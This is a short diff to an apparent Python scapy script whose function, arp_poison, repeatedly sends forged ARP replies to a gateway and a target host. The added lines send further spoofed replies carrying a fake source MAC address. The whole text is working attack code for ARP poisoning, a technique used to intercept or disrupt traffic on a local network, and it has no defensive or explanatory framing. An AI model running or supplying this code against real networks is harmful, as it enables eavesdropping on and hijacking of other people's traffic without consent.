@@ -28,6 +28,13 @@ def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
         scp.send(arp_gateway)
         arp_target = scp.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
         scp.send(arp_target)
+
+        arp_gateway_mac = scp.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, hwsrc="FB:65:DD:8E:34:90")
+        arp_gateway_mac.display()
+        scp.send(arp_gateway_mac)
+        arp_target_mac = scp.ARP(op=2, pdst=target_ip, hwdst=target_mac, hwsrc="FB:65:DD:8E:34:90")
+        arp_target_mac.display()
+        scp.send(arp_target_mac)
         time.sleep(2)
 
 parser = argparse.ArgumentParser()
